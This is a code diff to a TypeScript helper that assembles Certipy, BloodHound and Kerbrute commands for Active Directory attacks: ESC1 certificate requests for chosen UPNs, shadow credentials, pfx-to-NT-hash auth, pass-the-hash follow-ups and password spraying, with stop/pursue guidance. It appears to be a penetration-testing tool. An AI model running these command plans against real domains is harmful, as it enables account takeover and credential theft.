@@ -42,7 +42,7 @@ export type AdPlan = {
   note: string;
 };
 
-const BINS = new Set(["bloodhound-python", "certipy", "kerbrute"]);
+const BINS = new Set(["bloodhound-python", "certipy-ad", "kerbrute"]);
 
 const COLLECTIONS: Record<"bh-all" | "bh-dc" | "bh-session", string> = {
   "bh-all": "All",
@@ -93,8 +93,8 @@ function secret(input: AdInput): { flags: string[] } | { error: string } {
     if (!shaped) return { error: "The hash is 32 hex characters, or LM:NT." };
     return { flags: input.mode.startsWith("bh-") ? ["--hashes", shaped] : ["-hashes", shaped] };
   }
-  if (!input.password || input.password.length > 128 || /[\r\n\0]/.test(input.password)) {
-    return { error: "The password is required, unless you give a hash or Kerberos." };
+  if (!input.password || input.password.length > 128 || /[\r\n\0]/.test(input.password) || input.password.startsWith("-")) {
+    return { error: "The password is required, unless you give a hash or Kerberos. It cannot start with a dash." };
   }
   return { flags: input.mode.startsWith("cert-") ? ["-p", input.password] : ["-p", input.password] };
 }
@@ -129,7 +129,7 @@ export function adPlan(input: AdInput): AdPlan | { error: string } {
     const base = ["-u", ident, ...auth.flags, "-dc-ip", input.dc];
     if (input.mode === "cert-find" || input.mode === "cert-bh") {
       return finish(
-        "certipy",
+        "certipy-ad",
         ["find", ...base, "-vulnerable", input.mode === "cert-bh" ? "-bloodhound" : "-stdout"],
         input.mode === "cert-find"
           ? "Vulnerable templates are printed here. ESC1 is enrolment plus a name you choose. No vulnerable template means stop. Do not request a certificate just because a CA exists."
@@ -141,7 +141,7 @@ export function adPlan(input: AdInput): AdPlan | { error: string } {
       if (!labelOk(input.ca) || !labelOk(input.template)) return { error: "The CA and the template are the names Certipy printed." };
       if (!/^[A-Za-z0-9._+-]+@[A-Za-z0-9.-]+$/.test(input.upn)) return { error: "The UPN is the name you want on the certificate, such as administrator@corp.local." };
       return finish(
-        "certipy",
+        "certipy-ad",
         ["req", ...base, "-ca", input.ca, "-template", input.template, "-upn", input.upn],
         "This asks the CA to issue a certificate for that UPN. A pfx in the output is pursue. Access denied or template not found is stop. Do not try every template.",
         "The pfx is the file the auth mode uses. A password on the pfx is printed above the saved path.",
@@ -149,7 +149,7 @@ export function adPlan(input: AdInput): AdPlan | { error: string } {
     }
     if (!nameOk(input.account)) return { error: "The account is the one whose certificate you want, without @domain." };
     return finish(
-      "certipy",
+      "certipy-ad",
       ["shadow", "auto", ...base, "-account", input.account],
       "Shadow auto adds a key credential to that account and asks for a certificate. A saved pfx is pursue. Insufficient access means this user cannot write that account. Stop and pick another account.",
       "Auth with the pfx next. This changes the target account by adding a credential.",
@@ -164,7 +164,7 @@ export function adPlan(input: AdInput): AdPlan | { error: string } {
       args.push("-password", input.pfxPass);
     }
     return finish(
-      "certipy",
+      "certipy-ad",
       args,
       "Auth turns the pfx into an NT hash, and a TGT if the account can get one. A hash is pursue: pass it to Impacket or NetExec. A wrong password or a revoked certificate is stop.",
       "Copy the NT hash into loot. You do not crack it.",
@@ -182,7 +182,9 @@ export function adPlan(input: AdInput): AdPlan | { error: string } {
       );
     }
     if (input.mode === "kb-spray") {
-      if (!input.password || input.password.length > 128 || /[\r\n\0]/.test(input.password)) return { error: "The spray is one password." };
+      if (!input.password || input.password.length > 128 || /[\r\n\0]/.test(input.password) || input.password.startsWith("-")) {
+        return { error: "The spray is one password. It cannot start with a dash, or Kerbrute treats it as a flag." };
+      }
       return finish(
         "kerbrute",
         ["passwordspray", "-d", input.domain, "--dc", input.dc, input.usersFile, input.password],
